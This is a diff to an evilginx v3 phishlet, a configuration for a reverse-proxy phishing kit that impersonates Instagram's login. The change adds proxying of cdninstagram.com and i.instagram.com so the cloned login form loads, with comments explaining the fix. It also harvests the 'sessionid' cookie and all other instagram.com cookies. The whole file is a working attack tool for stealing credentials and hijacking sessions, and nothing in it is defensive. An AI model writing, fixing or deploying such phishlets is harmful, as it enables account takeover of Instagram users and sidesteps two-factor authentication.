@@ -1,13 +1,37 @@
-author: '@charlesbel (fixed for v3 by nethunter-pro)'
+author: '@charlesbel (fixed for v3 + CDN proxying by nethunter-pro)'
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
+  # Instagram web serves every JS/CSS bundle that renders the login form from
+  # static.cdninstagram.com via absolute URLs. Without proxying it, the browser
+  # fetches those bundles from the real CDN under the wrong origin and the SPA
+  # never mounts the form -- the page stops at the Instagram logo. These hosts
+  # are on separate domains (cdninstagram.com, fbcdn.net), so each maps to a
+  # subdomain of the phishing domain; auto_filter rewrites their appearances in
+  # the served HTML/JS so the browser stays on the phishing origin.
+  # session: true is required here, not just cosmetic: in evilginx v3.3.0
+  # GetPhishHosts()/get-hosts only emits a phishing subdomain (and a
+  # -developer self-signed cert) for proxy_hosts marked session: true. With
+  # session: false these CDN hosts get no vhost, so the browser's request to
+  # static.<phishdomain> hangs (http 000) and the login bundles never load --
+  # the page stops at the Instagram logo. true here does not capture extra
+  # cookies as credentials; auth_tokens below still scope what is harvested.
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'm.instagram.com', replace: 'm.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'm.instagram.com', replace: 'm.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'm.instagram.com', replace: 'm.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'm.instagram.com', replace: 'm.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  # Rewrite the CDN host in the served HTML/JS so bundle <script src> and CSS
+  # <link href> load through the phishing origin instead of the real CDN.
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'static.cdninstagram.com', replace: 'static.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent', domain: 'cdninstagram.com', search: 'scontent.cdninstagram.com', replace: 'scontent.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: 'i.instagram.com', replace: 'i.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'www.instagram.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
+  - {triggers_on: 'static.cdninstagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'static.cdninstagram.com', replace: 'static.{domain}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
 auth_tokens:
   - domain: '.instagram.com'
     keys: ['sessionid','.*,regexp']
